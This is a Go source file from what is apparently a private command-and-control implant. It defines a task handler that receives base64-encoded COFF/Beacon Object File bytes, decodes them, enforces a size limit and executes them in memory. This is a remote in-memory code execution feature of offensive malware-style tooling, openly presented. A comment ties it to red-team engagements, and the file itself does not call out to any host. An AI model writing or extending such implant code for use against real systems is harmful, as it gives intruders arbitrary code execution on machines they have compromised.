package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"

	"github.com/azizbinmohammad/private-c2/implant/modules/bof"
)

const maxBOFBytes = 16 << 20

// handleInlineExecute loads a COFF/BOF into memory and calls its entry point.
// The task is gated by the engagement's code-execution capability.
func handleInlineExecute(_ context.Context, args string) (string, error) {
	var req struct {
		COFF string `json:"coff"`
		Args string `json:"args,omitempty"`
	}
	if err := json.Unmarshal([]byte(args), &req); err != nil {
		return "", fmt.Errorf("inline_execute args must be JSON: %w", err)
	}
	if req.COFF == "" {
		return "", fmt.Errorf("inline_execute requires base64 COFF bytes")
	}
	coffBytes, err := base64.StdEncoding.DecodeString(req.COFF)
	if err != nil {
		return "", fmt.Errorf("coff must be base64: %w", err)
	}
	if len(coffBytes) > maxBOFBytes {
		return "", fmt.Errorf("COFF exceeds the %d-byte limit", maxBOFBytes)
	}
	var bofArgs []byte
	if req.Args != "" {
		bofArgs, err = base64.StdEncoding.DecodeString(req.Args)
		if err != nil {
			return "", fmt.Errorf("args must be base64: %w", err)
		}
	}
	result, err := bof.Execute(coffBytes, bofArgs)
	if err != nil {
		return "", err
	}
	return marshalJSON(result)
}
